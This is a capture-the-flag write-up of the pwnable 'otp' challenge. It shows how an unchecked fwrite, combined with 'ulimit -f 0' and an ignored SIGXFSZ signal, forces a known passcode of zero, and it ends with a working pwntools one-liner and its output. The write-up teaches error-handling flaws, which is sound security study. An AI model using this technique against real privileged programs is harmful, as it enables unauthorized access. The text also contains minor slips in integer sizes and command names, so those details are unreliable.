This challenge is an example of why many programmers nag about C being unsafe.
The culprit in our case is error handling, in C there are no Exceptions or a special
type model to enforce error handling.
This means that is possible to forget an error and not crash the program.
This is generally undesirable
(the program would most likely continue execution in a state the developer did not intend it to)
but perfect for us.

To see what I mean, let's inspect `otp.c`:
```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>

int main(int argc, char* argv[]){
	char fname[128];
	unsigned long long otp[2];

	if(argc!=2){
		printf("usage : ./otp [passcode]\n");
		return 0;
	}

	int fd = open("/dev/urandom", O_RDONLY);
	if(fd==-1) exit(-1);

	if(read(fd, otp, 16)!=16) exit(-1);
	close(fd);

	sprintf(fname, "/tmp/%llu", otp[0]);
	FILE* fp = fopen(fname, "w");
	if(fp==NULL){ exit(-1); }
	fwrite(&otp[1], 8, 1, fp);
	fclose(fp);

	printf("OTP generated.\n");

	unsigned long long passcode=0;
	FILE* fp2 = fopen(fname, "r");
	if(fp2==NULL){ exit(-1); }
	fread(&passcode, 8, 1, fp2);
	fclose(fp2);

	if(strtoul(argv[1], 0, 16) == passcode){
		printf("Congratz!\n");
		system("/bin/cat flag");
	}
	else{
		printf("OTP mismatch\n");
	}

	unlink(fname);
	return 0;
}
```

The `main` functions reads 2 8-bit integers `otp[0]` and `otp[1]` from `/dev/urandom`,
after which it opens `/tmp/$opt[0]` and writes `opt[1]` to it.
Later that same value is loaded into the `passcode` variable, this time reading from `/tmp/$opt[0]`.

Now at first glance this code looks perfectly sound, there are even checks
for the openings and reads, very responsible.
Except if we look closer we notice that not all functions are checked for errors.
In particular what interests us is the call to `fwrite`.
If that call fails, `fread` would also fail (can't read 4 bytes from an empty file)
and we would know the value of `passcode` (it's conveniently initialized to 0).

All that's left to figure out is how to sabotage the `fwrite` call.
This is probably the least intuitive part of the solution since it requires a little bit of UNIX trivia knowledge -
we can limit the number of bytes written to (but not read from!) a file using the `ulimit` command.
i.e. calling `unlimit -f 0` from the command line will prohibit any writes in any child processes the shell spawns.

Let's try it:
```
otp@pwnable:~$ ulimit -f 0
otp@pwnable:~$ gdb otp
(gdb) r 0
Starting program: /home/otp/otp 0

Program received signal SIGXFSZ, File size limit exceeded.
0x00007fbc7845d3c0 in __write_nocancel () at ../sysdeps/unix/syscall-template.S:84
84	../sysdeps/unix/syscall-template.S: No such file or directory.
(gdb)
```

To get pass the [SIGXFSZ](https://www.man7.org/linux/man-pages/man7/signal.7.html)
which by default causes a core dump
we should change the default action associated with that signal.
This can be done easily in python using the [signal](https://docs.python.org/2.7/library/signal.html) module.

Putting it all together we arrive at the final exploit:

```
otp@pwnable:~$ ulimit -f 0
otp@pwnable:~$ python -c "from pwn import *; import signal; signal.signal(signal.SIGXFSZ, signal.SIG_IGN); print process(['./otp', '0']).recvall()"
[+] Starting local process './otp': pid 433582
[+] Receiving all data: Done (90B)
[*] Process './otp' stopped with exit code 0 (pid 433582)
OTP generated.
Congratz!
...(flag)...
```
